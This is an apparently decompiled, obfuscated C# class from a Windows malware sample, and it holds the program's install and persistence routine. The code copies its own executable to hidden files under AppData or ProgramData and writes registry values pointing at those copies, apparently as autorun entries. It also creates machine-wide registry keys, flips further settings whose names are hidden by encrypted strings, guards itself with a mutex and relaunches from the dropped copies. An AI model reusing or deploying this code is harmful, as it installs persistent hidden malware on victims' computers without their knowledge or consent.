using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using ns0;
using ns1;
using ns3;
using ns5;

namespace ns6;

internal class Class11
{
	public static RegistryKey registryKey_0;

	private static Mutex mutex_0;

	public static void smethod_0(string[] string_0)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		Class9.smethod_5();
		Class13.smethod_0();
		if (string.Join(Convert.ToString(32), string_0) == _003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_19())
		{
			Process.Start(Class13.string_0);
			Environment.Exit(0);
		}
		if (Class13.bool_0)
		{
			registryKey_0 = Registry.LocalMachine;
		}
		else
		{
			registryKey_0 = Registry.CurrentUser;
		}
		try
		{
			Registry.CurrentUser.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_20(), writable: true)!.DeleteSubKey(Class13.string_2);
		}
		catch
		{
		}
		smethod_5();
		smethod_4();
		smethod_1();
		Class6.smethod_0();
		Class0.smethod_0();
		Class4.smethod_0();
		Class1.smethod_0();
	}

	private static void smethod_1()
	{
		if (Class13.bool_0)
		{
			Class13.string_5[0] = string.Format(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_21(), Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), Class13.string_5[0]);
			Class13.string_5[1] = string.Format(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_21(), Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles), Class13.string_5[1]);
		}
		else
		{
			Class13.string_5[0] = string.Format(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_21(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Class13.string_5[0]);
			Class13.string_5[1] = string.Format(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_21(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Class13.string_5[1]);
		}
		if (!smethod_3())
		{
			string[] string_ = Class13.string_5;
			foreach (string text in string_)
			{
				if (VG.smethod_2(Class13.string_0, text))
				{
					continue;
				}
				try
				{
					if (File.Exists(text))
					{
						File.Delete(text);
					}
					File.Copy(Class13.string_0, text, overwrite: true);
					File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.Archive);
				}
				catch
				{
				}
			}
			try
			{
				if (registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_22()) == null)
				{
					registryKey_0.CreateSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_22());
				}
			}
			catch
			{
			}
			try
			{
				if (registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_23()) == null)
				{
					registryKey_0.CreateSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_23());
				}
			}
			catch
			{
			}
			try
			{
				registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_22(), writable: true)!.SetValue(Class13.string_6[0], Class13.string_5[0]);
				registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_23(), writable: true)!.SetValue(Class13.string_6[1], Class13.string_5[1]);
			}
			catch
			{
			}
			try
			{
				if (Registry.LocalMachine.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_24() + Class13.string_2) == null)
				{
					Registry.LocalMachine.CreateSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_24() + Class13.string_2);
				}
				using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_24() + Class13.string_2, writable: true);
				registryKey.SetValue(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_25(), Class13.string_5[0] + _003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.UT());
				registryKey.SetValue(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_26(), 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
		}
		if (Class13.string_0 != Class13.string_5[0] && Class13.string_0 != Class13.string_5[1])
		{
			try
			{
				mutex_0.Close();
				string[] string_2 = Class13.string_5;
				foreach (string fileName in string_2)
				{
					Process.Start(fileName);
				}
			}
			catch
			{
			}
			Environment.Exit(0);
		}
		Class9.smethod_4(ref Class13.byte_0);
	}

	public static void smethod_2()
	{
		Class1.smethod_1();
		Class6.smethod_1();
		try
		{
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_22(), writable: true)!.DeleteValue(Class13.string_6[0]);
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_23(), writable: true)!.DeleteValue(Class13.string_6[1]);
			Registry.LocalMachine.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_20(), writable: true)!.DeleteSubKey(Class13.string_2);
		}
		catch
		{
		}
		string[] string_ = Class13.string_5;
		foreach (string path in string_)
		{
			try
			{
				if (File.Exists(path))
				{
					File.Delete(path);
				}
			}
			catch
			{
			}
		}
		try
		{
			mutex_0.Close();
		}
		catch
		{
		}
	}

	private static bool smethod_3()
	{
		string[] string_ = Class13.string_5;
		int num = 0;
		while (true)
		{
			if (num < string_.Length)
			{
				string string_2 = string_[num];
				if (!VG.smethod_2(Class13.string_0, string_2))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private static void smethod_4()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_27(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_28(), 2, RegistryValueKind.DWord);
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_27(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_29(), 0, RegistryValueKind.DWord);
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_30(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_31(), 0, RegistryValueKind.DWord);
		}
		catch
		{
		}
	}

	private static void smethod_5()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			mutex_0 = new Mutex(initiallyOwned: true, Class13.string_2);
			mutex_0.ReleaseMutex();
		}
		catch
		{
			Environment.Exit(0);
		}
	}
}
